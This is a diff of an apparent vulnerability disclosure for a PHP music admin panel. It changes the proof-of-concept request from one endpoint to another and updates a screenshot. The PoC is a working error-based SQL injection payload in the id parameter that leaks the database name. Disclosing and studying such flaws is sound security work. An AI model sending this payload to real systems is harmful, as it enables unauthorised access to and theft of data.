@@ -19,7 +19,7 @@ Status: CRITICAL
 
 POC
 ```
-GET /php-music/admin/?page=musics/view_music&id=4%27+and+updatexml(1%2Cconcat(0x7e%2C(database()))%2C3)--+q HTTP/1.1
+GET /php-music/admin/?page=musics/manage_music&id=1%27+and+updatexml(1%2Cconcat(0x7e%2C(database()))%2C3)--+q HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
@@ -33,5 +33,9 @@ Sec-Fetch-Mode: navigate
 Sec-Fetch-Site: none
 Sec-Fetch-User: ?1
 ```
-<img width="1197" alt="image" src="https://github.com/user-attachments/assets/1372dd3a-f865-41bb-8676-4ea4fb727a70">
+
+<img width="1223" alt="image" src="https://github.com/user-attachments/assets/a098ed0a-b3f2-4617-88a7-aff4735ef369">
+
+
+
 
